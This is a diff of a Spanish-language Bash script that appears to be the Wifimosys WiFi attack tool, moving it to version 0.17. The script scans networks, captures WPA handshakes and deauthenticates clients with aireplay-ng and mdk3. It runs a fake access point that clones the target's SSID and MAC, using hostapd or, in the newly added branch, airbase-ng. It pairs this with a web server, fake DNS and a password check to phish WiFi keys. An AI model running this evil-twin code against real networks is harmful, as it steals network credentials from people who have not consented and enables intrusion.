@@ -15,7 +15,7 @@ clear
 ##################################### Configuración general del script
 
 revision=1
-version=0.16
+version=0.17
 IP=192.168.1.1
 RUTATEMP="/tmp/Wifimosys"
 RUTAHANDSHAKE="/root/handshakes"
@@ -47,11 +47,6 @@ function limpialog() {
 if [[ "$wifim_output_device" != "/dev/stdout" ]]; then clear; fi
 }
 
-function airmon {
-chmod +x airmon-ng
-}
-airmon
-
 ##################################### Informe de error (solo en modo desarrollador)
 
 function err_report {
@@ -74,6 +69,11 @@ function exitmode {
 	top
 	echo -e $yellow"          Limpiando y cerrando..."$transparent
 	echo
+
+	if ps -A | grep -q airbase-ng; then
+		echo -e $white"          Finalizando "$green"airbase-ng"$transparent
+		killall airbase-ng &>$wifim_output_device
+	fi
 
 	if ps -A | grep -q aireplay-ng; then
 		echo -e $white"          Finalizando "$green"aireplay-ng"$transparent
@@ -109,17 +109,7 @@ function exitmode {
 		echo -e $white"          Finalizando "$green"mdk3"$transparent
 		killall mdk3 &>$wifim_output_device
 	fi
-
-	if [ "$WIFI_MONITOR" != "" ]; then
-		echo -e $white"          Deshabilitando interfaz de monitoreo "$green"$WIFI_MONITOR"$transparent
-		airmon-ng stop $WIFI_MONITOR &> $wifim_output_device
-	fi
-
-	if [ "$WIFI" != "" ]; then
-		echo -e $white"          Deshabilitando interfaz "$green"$WIFI"$transparent
-		airmon-ng stop $WIFI &> $wifim_output_device
-	fi
-
+	
 	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
 		echo -e $white"          Deshabilitando "$green"reenvio de paquetes"$transparent
 		sysctl -w net.ipv4.ip_forward=0 &>$wifim_output_device
@@ -134,6 +124,16 @@ function exitmode {
 	echo -e $white"          Restaurando "$green"tput"$transparent
 	tput cnorm
 
+	if [ "$WIFI" != "" ]; then
+		echo -e $white"          Deshabilitando interfaz "$green"$WIFI"$transparent
+		airmon-ng stop $WIFI &> $wifim_output_device
+	fi
+	
+	if [ "$WIFI_MONITOR" != "" ]; then
+		echo -e $white"          Deshabilitando interfaz de monitoreo "$green"$WIFI_MONITOR"$transparent
+		airmon-ng stop $WIFI_MONITOR &> $wifim_output_device
+	fi
+	
 	if [ $WIFIMOSYS_DEBUG != 1 ]; then
 
 		echo -e $white"          Borrando "$green"archivos del script"$transparent
@@ -166,7 +166,8 @@ function exitmode {
 ##################################### Cabecera
 
 function top {
-
+	
+	clear && echo -en "\e[3J"
 	echo
 	echo -e "$green	  ##########################################################"
 	echo -e "$green	  #                                                        #"
@@ -184,7 +185,7 @@ function top {
 
 function dependencias {
 
-	for depen in "aircrack-ng" "aireplay-ng" "airmon-ng" "airodump-ng" "awk   " "curl   " "dhcpd" "hostapd" "iwconfig" "lighttpd" "macchanger" "mdk3   " "openssl" "pyrit" "python" "xterm"
+	for depen in "airbase-ng" "aircrack-ng" "aireplay-ng" "airmon-ng" "airodump-ng" "awk   " "curl   " "dhcpd" "hostapd" "iwconfig" "lighttpd" "macchanger" "mdk3   " "openssl" "pyrit" "python" "xterm"
 do
 	echo -ne "          $depen"
 	if ! hash $depen 2>/dev/null; then
@@ -235,9 +236,9 @@ sleep 0.1 && echo -e $red "             _ _ _  _ | |__  _  ____    ___    ___  _
 sleep 0.1 && echo -e $red "            | | | || ||  __)| ||    \  / _ \  /___)| | | | /___)"
 sleep 0.1 && echo -e $red "            | | | || || |   | || | | || |_| ||___ || |_| ||___ |"
 sleep 0.1 && echo -e $red "             \____||_||_|   |_||_|_|_| \___/ (___/  \__  |(___/ "
-sleep 0.1 && echo -e $red "                                                   (____/       "
-top
+sleep 0.1 && echo -e $red "                                                   (____/       "$transparent
 sleep 3
+top
 
 ##################################### Muestra la info del AP seleccionado
 
@@ -247,7 +248,7 @@ Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}
 Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
 echo -e $yellow"          INFORMACIÓN DEL PUNTO DE ACCESO:"$transparent
 echo
-echo -e "             "$blue"Nombre"$transparent" : $Host_SSID / $Host_ENC"
+echo -e "               "$blue"SSID"$transparent" : $Host_SSID / $Host_ENC"
 echo -e "              "$blue"Canal"$transparent" : $channel"
 echo -e "                "$blue"MAC"$transparent" : $mac ($Host_MAC_MODEL $transparent)"
 echo
@@ -512,7 +513,7 @@ function selection {
 		
 	done < $RUTATEMP/dump-02.csv
 	echo
-	echo -e "          "$red"("$white"*"$red")"$white" En rojo: redes con clientes activos"$transparent""
+	echo -e "          "$red"("$white"*"$red")"$white" En rojo: redes con posibles clientes activos"$transparent""
 	echo
 	echo -e $yellow"          Selecciona el nº de la red a atacar.$grey Para reescanear pulsa$red r$transparent"
 	echo
@@ -539,7 +540,6 @@ function selection {
 	Host_SSID=${ssid:1:fin}
 
 	limpialog
-
 	caphandshake;
 }
 
@@ -569,11 +569,11 @@ function caphandshake {
 						cp "$handshakeloc" $RUTATEMP/$Host_MAC-01.cap
 						CreaSSL
 					else
-					echo -e "${yellow}          Handshake corrupto"$transparent
+					echo -e "${red}          Handshake corrupto"$transparent
 					sleep 3
 					fi
 				else
-					echo -e "${yellow}          El archivo no corresponde con la red seleccionada"$transparent
+					echo -e "${red}          El archivo no corresponde con la red seleccionada"$transparent
 					sleep 3
 					caphandshake
 				fi
@@ -711,7 +711,7 @@ function checkhandshake {
 		break
 	else
 		if aircrack-ng $RUTATEMP/$Host_MAC-01.cap | grep -q "1 handshake"; then
-			Handshake_statuscheck="${yellow}Handshake corrupto, prueba de nuevo$transparent"
+			Handshake_statuscheck="${red}Handshake corrupto, prueba de nuevo$transparent"
 			deauthMENU
 		else
 			Handshake_statuscheck="${red}Archivo no válido o inexistente$transparent"
@@ -969,15 +969,22 @@ function ataque3 {
 	compruebapass
 	nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)
 
-	ifconfig $WIFI down
+
+
+	if [ "$(echo $WIFIDRIVER | grep -i 8187)" ]; then
+		interfaceroutear=at0
+		killall airbase-ng &> $wifim_output_device
+		xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "FAKE AP (airbase)" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
+	else
+		ifconfig $WIFI down
 		sleep 0.4
 		macchanger --mac=${mac::13}$nomac${mac:14:4} $WIFI &> $wifim_output_device
 		sleep 0.4
 		ifconfig $WIFI up
 		sleep 0.4
-	
 		killall hostapd &> $wifim_output_device
-		xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "FAKE AP" -e hostapd $RUTATEMP/hostapd.conf &
+		xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "FAKE AP (hostapd)" -e hostapd $RUTATEMP/hostapd.conf &
+	fi
 
 	sleep 3
 	routear &
@@ -1005,13 +1012,13 @@ function ataque3 {
 	infoap
 	echo -e ""$yellow"          Atacando al objetivo..."$transparent
 	echo
-	echo -e "         $blue 1)$transparent Parar el ataque y elegir otra red"$transparent
+	echo -e "         $blue 1)$transparent Parar el ataque y escanear redes"$transparent
 	echo -e "         $blue 2)$transparent Parar el ataque y salir"$transparent
 	echo
 	echo -n '          #> '
 	read yn
 	case $yn in
-		1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
+		1 ) matartodo; sleep 3; limpieza; break;;
 		2 ) matartodo; exitmode; break;;
 		* ) echo "          Elige una de la opciones que se muestran."; limpialog ;;
 	esac
@@ -1107,6 +1114,7 @@ function compruebapass {
 
 	killall mdk3 &>$wifim_output_device
 	killall aireplay-ng &>$wifim_output_device
+	killall airbase-ng &>$wifim_output_device
 	kill \$(ps a | grep python| grep fakedns | awk '{print \$1}') &>$wifim_output_device
 	killall hostapd &>$wifim_output_device
 	killall lighttpd &>$wifim_output_device
